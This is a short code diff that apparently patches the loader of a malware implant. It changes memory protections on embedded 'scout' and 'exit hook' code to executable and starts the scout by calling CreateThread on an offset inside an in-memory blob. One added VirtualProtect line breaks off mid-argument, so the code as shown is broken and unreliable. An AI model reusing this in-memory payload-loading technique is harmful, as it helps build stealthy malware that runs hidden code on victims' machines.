@@ -215,6 +215,8 @@ endmagicloop:
 
 	// this is used to hold the dll path for CoreThreadProc
 	pfn_VirtualProtect(&header->dllPath, 4096, PAGE_READWRITE, &uOldProtect);
+	// exit hook
+	pfn_VirtualProtect(((PBYTE)header + header->functions.exitProcessHook.offset), header->functions.load.size, PAGE_EXECUTE_READ, 
 
 	if (header->isScout)
 	{
@@ -234,6 +236,7 @@ endmagicloop:
 		pData->pScoutBuffer = pScoutBuffer;
 		pData->pScoutSize = header->files.core.original_size;
 
+		pfn_VirtualProtect(((PBYTE)header + header->functions.load.offset), header->functions.load.size, PAGE_EXECUTE_READ, &uOldProtect);
 		// *** start the scout
 		HANDLE hThread = pData->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((PBYTE)header + header->functions.load.offset), pData, 0, NULL);
 	}
